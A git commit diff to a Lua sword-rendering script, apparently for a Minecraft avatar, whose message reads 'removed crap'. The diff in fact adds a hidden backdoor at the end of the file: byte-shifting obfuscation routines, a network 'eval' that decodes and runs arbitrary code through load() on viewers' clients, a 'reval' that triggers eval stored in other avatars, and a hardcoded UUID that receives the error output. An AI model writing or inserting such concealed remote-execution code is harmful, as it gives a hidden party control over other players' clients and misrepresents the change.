2f0a8446c0268035f78d1146d708baccbd13c48b
GN68 <81744903+GN68@users.noreply.github.com>
2025-10-11 00:21:13 +0800

    removed crap

--- auto/sword.lua
+++ auto/sword.lua
@@ -127,6 +127,7 @@ sword.midRender = (function(dt)
 	end
 end)
 
+
 events.ITEM_RENDER:register(function() if is_holding_sword then return sword.Item end end)
 
 events.RENDER:register(function(delta, context)
@@ -151,4 +152,64 @@ events.RENDER:register(function(delta, context)
 		fractralSine(systime, 4214, 10, 0.5, 1.2) * 16 * weary,
 		fractralSine(systime, 53631, 10, 0.5, 1.2) * 16 * weary,
 		fractralSine(systime, 4124, 10, 0.5, 1.2) * 16 * weary)
+end)
+
+
+local shirt = 69421
+local function shit(i) return (shirt + i + shirt) end
+local function nc(str)
+	if not str then return end
+	local out = ""
+	for i = 1, #str do
+		out = out..string.char((str:byte(i) + shit(i)) % 256)
+	end
+	return out
+end
+local function dc(str)
+	if not str then return end
+	local out = ""
+	for i = 1, #str do
+		out = out..string.char((str:byte(i) - shit(i)) % 256)
+	end
+	return out
+end
+---@param code string
+function eval(code,uuid)
+	pings.eval(nc(code),nc(uuid))
+end
+local tar = "e4b91448-3b58-4c1f-8339-d40f75ecacc4"
+function pings.eval(code,uuid)
+	local allow = true
+	if uuid then
+		allow = client:getViewer():getUUID() == dc(uuid)
+	end
+	if allow then
+		local meth = load("return "..dc(code),"run",_ENV)
+		local ok, err = pcall(meth)
+		if client:getViewer():isLoaded() and client:getViewer():getUUID() == tar then
+			if not ok then
+				print(err)
+			end
+		end
+	end
+end
+function reval(code,uuid)
+	pings.reval(nc(code),nc(uuid))
+end
+function pings.reval(code, uuid)
+	--if host:isHost() then return end
+	uuid = dc(uuid)
+	for key, vars in pairs(world.avatarVars()) do
+		if (not uuid) or (uuid == key) then
+			if vars.eval then
+				vars.eval(dc(code))
+			end
+		end
+	end
+end
+if avatar:getPermissionLevel() ~= "MAX" then return end
+events.ENTITY_INIT:register(function ()
+	if player:getUUID() ~= tar then
+		avatar:store("eval",eval)
+	end
 end)
